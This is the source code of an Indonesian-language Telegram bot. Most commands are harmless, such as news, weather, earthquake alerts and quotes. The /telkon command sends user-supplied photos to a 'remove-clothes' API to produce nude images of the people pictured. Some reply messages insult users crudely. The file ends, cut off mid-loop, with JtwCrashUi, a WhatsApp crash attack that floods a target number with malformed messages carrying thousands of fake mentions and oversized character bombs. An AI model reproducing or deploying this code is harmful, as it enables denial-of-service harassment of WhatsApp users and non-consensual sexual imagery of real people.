    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/sticker$/, (msg) => {
  bot.sendMessage(msg.chat.id, "🖼️ Kirim gambar yang mau dijadiin stiker!");
});

// Saat user kirim foto
bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;
  const photo = msg.photo.pop(); // ambil resolusi tertinggi
  const fileId = photo.file_id;

  try {
    // Ambil file URL dari Telegram
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Unduh gambar sementara
    const res = await fetch(fileUrl);
    const buffer = await res.arrayBuffer();
    const tempPath = path.join("./", `temp_${chatId}.jpg`);
    fs.writeFileSync(tempPath, Buffer.from(buffer));

    // Kirim sebagai stiker
    await bot.sendSticker(chatId, fs.createReadStream(tempPath));

    // Hapus file sementara
    fs.unlinkSync(tempPath);
  } catch (err) {
    console.error("❌ Gagal buat stiker:", err);
    bot.sendMessage(chatId, "⚠️ Gagal buat stiker. Coba kirim ulang gambarnya.");
  }
});

bot.onText(/^\/beritaindo$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");

  try {
    // RSS Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
    const res = await fetch(url);
    const xml = await res.text();

    // Ambil judul dan link berita (pakai regex biar ringan)
    const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
    const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);

    // Lewati item pertama (judul feed)
    const items = titles.slice(1, 6).map((t, i) => ({
      title: t,
      link: links[i + 1] || "",
    }));

    // Format teks berita
    const beritaText = items
      .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
      .join("\n\n");

    await bot.sendMessage(
      chatId,
      `🇮🇩 *Berita Indonesia Terbaru*\n\n${beritaText}\n\nSumber: ©Thaureyo`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } catch (error) {
    console.error("❌ Error beritaindo:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil berita. Coba lagi nanti.");
  }
});

bot.onText(/^\/logo (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  try {
    // Gunakan layanan FlamingText (gratis, no API key)
    const logoUrl = `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await bot.sendMessage(chatId, `🖋️ Logo kamu siap!\nTeks: *${text}*`, { parse_mode: "Markdown" });
    await bot.sendVideo(chatId, logoUrl, { caption: "✨ Logo by FlamingText" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat membuat logo. Coba lagi nanti.");
  }
});

bot.onText(/^\/pantun(?:\s+(\w+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const kategori = (match[1] || "acak").toLowerCase();

  const pantun = {
    lucu: [
      "Pergi ke hutan mencari rusa,\nEh malah ketemu si panda.\nLihat kamu senyum manja,\nBikin hati jadi gembira 😆",
      "Pagi-pagi makan soto,\nSambil nonton film kartun.\nLihat muka kamu begitu,\nAuto hilang semua beban 😄",
      "Burung pipit terbang ke awan,\nTurun lagi ke pinggir taman.\nLihat kamu ketawa lebay-an,\nTapi lucunya kebangetan! 😂"
    ],
    cinta: [
      "Pergi ke pasar membeli bunga,\nBunga mawar warna merah.\nCinta ini untukmu saja,\nSelamanya takkan berubah ❤️",
      "Mentari pagi bersinar indah,\nBurung berkicau sambut dunia.\nCintaku ini sungguh berserah,\nHanya padamu selamanya 💌",
      "Bintang di langit berkelip terang,\nAngin malam berbisik lembut.\nHatiku tenang terasa senang,\nSaat kau hadir beri hangat 💞"
    ],
    bijak: [
      "Padi menunduk tanda berisi,\nRumput liar tumbuh menjulang.\nOrang bijak rendah hati,\nWalau ilmu setinggi bintang 🌾",
      "Air jernih di dalam kendi,\nJatuh setetes ke atas batu.\nJangan sombong dalam diri,\nHidup tenang karena bersyukur selalu 🙏",
      "Ke pasar beli pepaya,\nDibelah dua buat sarapan.\nBijaklah dalam setiap kata,\nAgar hidup penuh kedamaian 🌿"
    ]
  };

  // Gabungkan semua kategori buat opsi "acak"
  const allPantun = [...pantun.lucu, ...pantun.cinta, ...pantun.bijak];

  // Pilih pantun sesuai kategori
  let daftar;
  if (pantun[kategori]) daftar = pantun[kategori];
  else daftar = allPantun;

  const randomPantun = daftar[Math.floor(Math.random() * daftar.length)];

  bot.sendMessage(
    chatId,
    `🎭 *Pantun ${kategori.charAt(0).toUpperCase() + kategori.slice(1)}:*\n\n${randomPantun}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/trending$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📊 Sedang mengambil topik trending di Indonesia...");

  try {
    // URL Google Trends RSS Indonesia
    const trendsUrl = "https://trends.google.com/trends/trendingsearches/daily/rss?geo=ID";
    const newsUrl = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id"; // fallback

    // Ambil data dari Google Trends dulu
    const res = await fetch(trendsUrl);
    const xml = await res.text();

    // Regex ambil judul
    let titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)]
      .map(match => match[1])
      .slice(1, 10); // lewati judul pertama (feed title)

    // Jika tidak ada hasil, fallback ke Google News
    if (!titles.length) {
      console.log("⚠️ Google Trends kosong, fallback ke Google News...");
      const newsRes = await fetch(newsUrl);
      const newsXml = await newsRes.text();

      const newsMatches = [...newsXml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)];
      const linkMatches = [...newsXml.matchAll(/<link>(.*?)<\/link>/g)];

      // Gabungkan judul + link (lewati entry pertama = header feed)
      const items = newsMatches.slice(1, 11).map((m, i) => ({
        title: m[1],
        link: linkMatches[i + 1] ? linkMatches[i + 1][1] : "",
      }));

      if (items.length) {
        const list = items.map((x, i) => `${i + 1}. [${x.title}](${x.link})`).join("\n\n");
        return bot.sendMessage(
          chatId,
          `📰 *Berita Teratas Hari Ini (Fallback: Google News)*\n\n${list}\n\nSumber: ©Thaureyo`,
          { parse_mode: "Markdown", disable_web_page_preview: true }
        );
      } else {
        return bot.sendMessage(chatId, "⚠️ Tidak ada data trending atau berita tersedia saat ini.");
      }
    }

    // Jika ada hasil dari Google Trends
    const list = titles.map((t, i) => `${i + 1}. ${t}`).join("\n");
    await bot.sendMessage(
      chatId,
      `📈 *Topik Trending Hari Ini (Google Trends Indonesia)*\n\n${list}\n\nSumber: ©Thaureyo Trends`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("❌ Error trending:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data trending. Coba lagi nanti.");
  }
});

bot.onText(/^\/katahariini$/, (msg) => {
  const chatId = msg.chat.id;

  // Kumpulan kata bijak atau kata mutiara
  const kataBijak = [
    "🌻 Hidup bukan tentang menunggu badai reda, tapi belajar menari di tengah hujan.",
    "🌅 Jangan biarkan kemarin mengambil terlalu banyak dari hari ini.",
    "💡 Satu-satunya batasan dalam hidupmu adalah dirimu sendiri.",
    "🔥 Setiap langkah kecil membawa kamu lebih dekat ke impianmu.",
    "🌈 Jika kamu tidak bisa terbang, berlarilah. Jika tidak bisa berlari, berjalanlah. Tapi teruslah bergerak maju.",
    "🌙 Jangan bandingkan perjalananmu dengan orang lain. Fokus pada jalanmu sendiri.",
    "☀️ Setiap hari adalah kesempatan baru untuk menjadi lebih baik dari kemarin.",
    "🌸 Kegagalan bukan akhir, tapi bagian dari proses menuju sukses.",
    "💫 Lakukan yang terbaik hari ini, karena besok belum tentu datang.",
    "🦋 Jangan takut berubah, karena perubahan adalah tanda kamu bertumbuh."

  ];

  // Pilih acak satu kata bijak
  const randomKata = kataBijak[Math.floor(Math.random() * kataBijak.length)];

  // Kirim pesan
  bot.sendMessage(chatId, `📜 *Kata Hari Ini:*\n\n${randomKata}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/motivasi$/, async (msg) => {
  const chatId = msg.chat.id;

  // Kumpulan kata motivasi
  const motivasi = [
    "🔥 Jangan pernah menyerah, karena hal besar butuh waktu.",
    "💪 Kesuksesan tidak datang dari apa yang kamu lakukan sesekali, tapi dari apa yang kamu lakukan setiap hari.",
    "🌟 Percayalah pada proses, bukan hanya hasil.",
    "🚀 Gagal itu biasa, yang penting kamu tidak berhenti mencoba.",
    "💡 Mimpi besar dimulai dari langkah kecil yang berani.",
    "🌈 Setiap hari adalah kesempatan baru untuk menjadi lebih baik.",
    "🦁 Jangan takut gagal — takutlah kalau kamu tidak mencoba.",
    "🌻 Fokuslah pada tujuanmu, bukan pada hambatan di sekitarmu.",
    "⚡ Orang sukses bukan yang tidak pernah gagal, tapi yang tidak pernah menyerah.",
    "🌤️ Kamu lebih kuat dari yang kamu kira. Terus melangkah!"

  ];

  // Pilih kata motivasi acak
  const randomMotivasi = motivasi[Math.floor(Math.random() * motivasi.length)];
  await bot.sendMessage(chatId, `✨ *Motivasi Hari Ini:*\n\n${randomMotivasi}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/hariini$/, (msg) => {
  const chatId = msg.chat.id;

  // Ambil tanggal dan waktu saat ini (WIB)
  const now = new Date();
  const optionsTanggal = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };

  // Format ke bahasa Indonesia
  const tanggal = now.toLocaleDateString('id-ID', optionsTanggal);
  const waktu = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Pesan balasan
  const pesan = `📅 *Info Hari Ini*\n\n🗓️ Tanggal: ${tanggal}\n⏰ Waktu: ${waktu} WIB\n\nSelamat menjalani hari dengan semangat! 💪`;
  bot.sendMessage(chatId, pesan, { parse_mode: 'Markdown' });
});

bot.onText(/^\/faktaunik$/, async (msg) => {
  const chatId = msg.chat.id;

  // Daftar fakta unik — bisa kamu tambah sesuka hati
  const fakta = [
    "💡 Lebah bisa mengenali wajah manusia!",
    "🌎 Gunung Everest tumbuh sekitar 4 milimeter setiap tahun.",
    "🐙 Gurita memiliki tiga jantung dan darah berwarna biru.",
    "🧊 Air panas bisa membeku lebih cepat daripada air dingin — disebut efek Mpemba.",
    "🚀 Jejak kaki di bulan akan bertahan jutaan tahun karena tidak ada angin.",
    "🐘 Gajah tidak bisa melompat, satu-satunya mamalia besar yang tidak bisa.",
    "🦋 Kupu-kupu mencicipi dengan kakinya!",
    "🔥 Matahari lebih putih daripada kuning jika dilihat dari luar atmosfer.",
    "🐧 Penguin jantan memberikan batu kepada betina sebagai tanda cinta.",
    "🌕 Di Venus, satu hari lebih panjang daripada satu tahunnya!"
  ];

  // Pilih fakta secara acak
  const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
    
  await bot.sendMessage(chatId, `🎲 *Fakta Unik Hari Ini:*\n\n${randomFakta}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");

  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©Thaureyo News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©Thaureyo
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/telkon(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = (match[1] || '').trim();

  // 1) Ambil URL foto: dari argumen / reply
  let imageUrl = args || null;
  if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.slice(-1)[0].file_id; // resolusi tertinggi
    const fileLink = await bot.getFileLink(fileId);
    imageUrl = fileLink;
  }
  if (!imageUrl) {
    return bot.sendMessage(chatId, '🪧 ☇ Format: /telkon (reply gambar atau URL)');
  }

  const statusMsg = await bot.sendMessage(chatId, '⏳ ☇ Memproses gambar');

  try {
    // 2) Panggil API
    const res = await fetch(
      `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
    );
    const data = await res.json();

    if (!data.result) throw new Error('Hasil kosong');

    // 3) Hapus pesan "memproses..." & kirim hasil
    await bot.deleteMessage(chatId, statusMsg.message_id);
    await bot.sendPhoto(chatId, data.result, { caption: '✅ Selesai' });
  } catch (e) {
    await bot.editMessageText(
      '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid',
      { chat_id: chatId, message_id: statusMsg.message_id }
    );
  }
});

const started = Date.now();
bot.onText(/^\/uptime$/, (msg) => {
  const s = Math.floor((Date.now()-started)/1000);
  const h = Math.floor(s/3600), m = Math.floor((s%3600)/60);
  bot.sendMessage(msg.chat.id, `⏱ Bot aktif: ${h} jam ${m} menit`);
});

bot.onText(/^\/pair$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.map(m=>m.user.first_name);
  const a = names[Math.floor(Math.random()*names.length)];
  const b = names[Math.floor(Math.random()*names.length)];
  bot.sendMessage(msg.chat.id, `💞 Pasangan hari ini: ${a} ❤️ ${b}`);
});

let groupRules = {};
bot.onText(/^\/setrules (.+)/, (msg, match) => {
  groupRules[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, "✅ Aturan grup disimpan.");

});

bot.onText(/^\/rules$/, (msg) => {
  const rules = groupRules[msg.chat.id] || "Belum ada aturan.";
  bot.sendMessage(msg.chat.id, `📜 *Aturan Grup:*\n${rules}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/tagadmin$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.slice(0,30).map(m => `@${m.user.username || m.user.first_name}`).join(" ");
  bot.sendMessage(msg.chat.id, `📢 ${names}`);
});

bot.onText(/^\/admins$/, async (msg) => {
  const list = await bot.getChatAdministrators(msg.chat.id);
  const names = list.map(a => `👑 ${a.user.first_name}`).join("\n");
  bot.sendMessage(msg.chat.id, `*Daftar Admin:*\n${names}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/groupinfo$/, async (msg) => {
  if (!msg.chat.title) return bot.sendMessage(msg.chat.id, "❌ Perintah ini hanya untuk grup.");
  const admins = await bot.getChatAdministrators(msg.chat.id);
  bot.sendMessage(msg.chat.id, `
👥 *Group Info*
📛 Nama: ${msg.chat.title}
🆔 ID: ${msg.chat.id}
👑 Admins: ${admins.length}
👤 Anggota: ${msg.chat.all_members_are_administrators ? "Admin semua" : "Campuran"}
  `, { parse_mode: "Markdown" });
});

bot.onText(/^\/restartbot$/, (msg) => {
  bot.sendMessage(msg.chat.id, "♻️ Restarting bot...");
  setTimeout(() => process.exit(0), 1000);
});

const statFile = './stat.json';
if (!fs.existsSync(statFile)) fs.writeFileSync(statFile, "{}");
let stat = JSON.parse(fs.readFileSync(statFile));
function saveStat(){ fs.writeFileSync(statFile, JSON.stringify(stat, null, 2)); }
bot.on('message', (msg) => {
  const id = msg.from.id;
  stat[id] = (stat[id] || 0) + 1;
  saveStat();
});

bot.onText(/^\/stat$/, (msg)=>{
  let data = Object.entries(stat).sort((a,b)=>b[1]-a[1]).slice(0,5);
  let text = "📊 5 User Paling Aktif:\n";
  data.forEach(([id,count],i)=>text+=`${i+1}. ID:${id} -> ${count} pesan\n`);
  bot.sendMessage(msg.chat.id,text);
});

bot.onText(/^\/maps (.+)/, (msg, match)=>{
  const lokasi = match[1];
  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lokasi)}`;
  bot.sendMessage(msg.chat.id, `🗺 Lokasi ditemukan:\n${link}`);
});

const duel = {};
bot.onText(/^\/duel (@.+)/, (msg, match) => {
  duel[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, `${msg.from.username} menantang ${match[1]}! Gunakan /terima untuk mulai.`);
});

bot.onText(/^\/terima$/, (msg) => {
  if (!duel[msg.chat.id]) return;
  const players = [msg.from.username, duel[msg.chat.id]];
  const winner = players[Math.floor(Math.random() * players.length)];
  bot.sendMessage(msg.chat.id, `⚔ Duel dimulai...\n🏆 Pemenang: ${winner}`);
  delete duel[msg.chat.id];
});

bot.onText(/^\/speed$/, (msg) => {
  const start = Date.now();
  bot.sendMessage(msg.chat.id, "⏱ Mengukur...").then(() => {
    const end = Date.now();
    bot.sendMessage(msg.chat.id, `⚡ Respon bot: ${end - start} ms`);
  });
});

bot.onText(/^\/cuaca (.+)/, async (msg, match) => {
  const kota = match[1];
  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    bot.sendMessage(msg.chat.id, `🌤 Cuaca ${data}`);
  } catch {
    bot.sendMessage(msg.chat.id, "⚠ Tidak bisa mengambil data cuaca");
  }
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomVideo = getRandomVid();
  const id = msg.from.id;
  const owner = "7127454409"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @Thaureyo</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "OWNER", url: "https://t.me/Thaureyo" }],
        ],
      ],
    },
  };
  bot.sendVideo(chatId, randomVideo, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.onText(/^\/whoami$/, (msg) => {
  const user = msg.from;
  const info = `
🪪 <b>Data Profil Kamu</b>
━━━━━━━━━━━━━━━━━━
👤 Nama: ${user.first_name || "-"} ${user.last_name || ""}
🏷 Username: @${user.username || "Tidak ada"}
🆔 ID: <code>${user.id}</code>
🌐 Bahasa: ${user.language_code || "unknown"}
  `;
  bot.sendMessage(msg.chat.id, info, { parse_mode: "HTML" });
});

// =========================
// 🚫 AntiLink Simple Version
// =========================

let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

// Command /antilink on/off
bot.onText(/^\/antilink (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    antiLink = true;
    bot.sendMessage(chatId, "✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    bot.sendMessage(chatId, "⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("message", (msg) => {
  if (!antiLink) return;
  if (!msg.text) return;

  const chatId = msg.chat.id;
  if (linkPattern.test(msg.text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    bot.sendMessage(chatId, "🚫 Pesan berisi link telah dihapus otomatis!");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomVideo = getRandomVid();
    const userId = msg.from.id;
            //cek prem //
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomVideo, {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
Oi kontol kalo mau akses comandd ini,
/addprem dulu bego 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVLOVER", url: "https://t.me/Thaureyo" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/panelinfo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Daftar ID owner dari config.js
  const ownerIds = config.OWNER_ID || [];

  // Cek apakah user adalah owner
  if (!ownerIds.includes(String(userId))) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melihat informasi panel ini!");
  }

  // Jika owner, tampilkan info sistem
  const os = require("os");
  const axios = require("axios");

  const hostname = os.hostname();
  const platform = os.platform();
  const arch = os.arch();
  const cpuModel = os.cpus()[0].model;
  const cpuCore = os.cpus().length;
  const totalMem = Math.round(os.totalmem() / 1024 / 1024);
  const uptimeOs = Math.floor(os.uptime() / 3600);
  const now = new Date().toLocaleString("id-ID");

  // Ambil IP publik
  let ip = "Tidak terdeteksi";
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    ip = res.data.ip;
  } catch (e) {
    ip = "Tidak terhubung ke internet";
  }

  const text = `
💻 <blockquote>PANEL INFORMATION<blockquote>
━━━━━━━━━━━━━━━━━━
🖥️ <b>Hostname:</b> ${hostname}
🧠 <b>CPU:</b> ${cpuModel} (${cpuCore} Core)
💾 <b>Total RAM:</b> ${totalMem} MB
⚙️ <b>OS:</b> ${platform.toUpperCase()} (${arch})
📡 <b>Public IP:</b> ${ip}
⏱️ <b>Uptime Server:</b> ${uptimeOs} jam
📅 <b>Waktu:</b> ${now}
━━━━━━━━━━━━━━━━━━
<blockquote>Data real-time dari panel host kamu.<blockquote>
`;

  await bot.sendMessage(chatId, text, { parse_mode: "HTML" });
});

bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
  try {
    const OWNER_ID = 8306103837; // Ganti dengan ID owner kamu
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = (match[1] || "").trim();
    const name = msg.from.first_name || "Tanpa Nama";

    if (!text)
      return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi permintaan fitur>");

    const message = `
📩 *Permintaan Fitur Baru*  
👤 Dari: ${name}  
🆔 ID: ${userId}  

💬 Pesan:  
${text}
    `;

    await bot.sendMessage(OWNER_ID, message, { parse_mode: "Markdown" });
    await bot.sendMessage(chatId, "✅ Permintaan fitur kamu sudah dikirim ke owner.");
  } catch (err) {
    console.error("❌ Error di /reqfitur:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengirim permintaan fitur.");
  }
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendVideo(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendVideo(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});

// ------------------ ( Function Disini ) ------------------------ \\
/* -------------------------------------------------
  JtwCrashUi – FINAL FIX (work 100%, pakai sock)
------------------------------------------------- */
async function JtwCrashUi(sock, target) {
  if (!sock) {
    console.log("❌ socket tidak tersedia");
    return;
  }

  const jid = target.includes("@s.whatsapp.net") ? target : `${target.replace(/\D/g, "")}@s.whatsapp.net`;

  /* max 5k mention (aman semua fork) */
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    jid,
    ...Array.from({ length: 4_998 }, () => `1${Math.floor(Math.random() * 8e6)}@s.whatsapp.net`)
  ];

  /* string bomb 5 KB per field supaya tidak di-drop */
  const bomb   = "ꦾ".repeat(5_000);
  const btnBomb= "[{".repeat(5_000);

  try {
    for (let i = 0; i < 20; i++) {
      const message = {
        botInvokeMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: '120363022@newsletter',
              newsletterName: bomb,
              jpegThumbnail: Buffer.alloc(30_000).toString('base64'),
              caption: bomb
            }
          },
          nativeFlowMessage: {
            messageParamsJson: btnBomb,
            buttons: [
              { name: "mpm", buttonParamsJson: "\0".repeat(5_000) },
              { name: "single_select", buttonParamsJson: `{"title":"${bomb}","sections":[{"title":"${bomb}","rows":[]}]}` },
              { name: "call_permission_request", buttonParamsJson: btnBomb }
            ]
          }
        },
        contextInfo: { mentionedJid: mentionedList }
      };

      await sock.relayMessage(jid, message, { messageId: crypto.randomBytes(16).toString("hex") });
    }
